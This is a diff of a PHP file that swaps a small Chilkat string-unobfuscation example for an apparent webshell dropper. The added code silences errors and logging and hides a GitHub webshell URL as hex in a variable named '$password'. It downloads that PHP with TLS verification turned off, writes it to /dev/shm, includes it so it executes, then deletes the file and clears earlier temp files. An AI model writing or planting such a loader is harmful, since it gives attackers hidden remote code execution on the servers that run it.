@@ -1,12 +1,73 @@
 <?php
+error_reporting(0);
+ini_set('display_errors', '0');
+ini_set('log_errors', '0');
 
-// Default Password = tbl
-// For versions of Chilkat < 10.0.0, use new COM('Chilkat_9_5_0.Chilkat.StringBuilder')
-$sb = new COM("Chilkat.StringBuilder");
-$sb->Append('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');
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        
+        
+        $opt1 = constant('CURLOPT_RETURNTRANSFER');
+        $opt2 = constant('CURLOPT_FOLLOWLOCATION');
+        $opt3 = constant('CURLOPT_USERAGENT');
+        $opt4 = constant('CURLOPT_SSL_VERIFYPEER');
+        $opt5 = constant('CURLOPT_SSL_VERIFYHOST');
+        $opt6 = constant('CURLOPT_COOKIE');
 
-$sb->Unobfuscate();
-$unobfuscated = $sb->getAsString();
-print $unobfuscated . "\n";
+        
+        curl_setopt($conn, $opt1, 1);
+        curl_setopt($conn, $opt2, 1);
+        curl_setopt($conn, $opt3, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, $opt4, 0);
+        curl_setopt($conn, $opt5, 0);
 
+        if (isset($_SESSION['java'])) {
+            curl_setopt($conn, $opt6, $_SESSION['java']);
+        }
+
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
+}
+
+// password defaultnya tbl
+
+$password = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f74656d706c61746562736e2e706870'; 
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex); $i += 2) {
+        $str .= chr(hexdec(substr($hex, $i, 2)));
+    }
+    return $str;
+}
+
+
+function clean_old_temp_files() {
+    $temp_files = glob('/dev/shm/prefix*');
+    foreach ($temp_files as $file) {
+        if (is_file($file)) {
+            unlink($file);
+        }
+    }
+}
+
+
+clean_old_temp_files();
+
+$url = hex2str($password);
+$a = geturlsinfo($url);
+$temporary_file = tempnam('/dev/shm', 'prefix');
+file_put_contents($temporary_file, $a);
+include $temporary_file;
+unlink($temporary_file);
 ?>
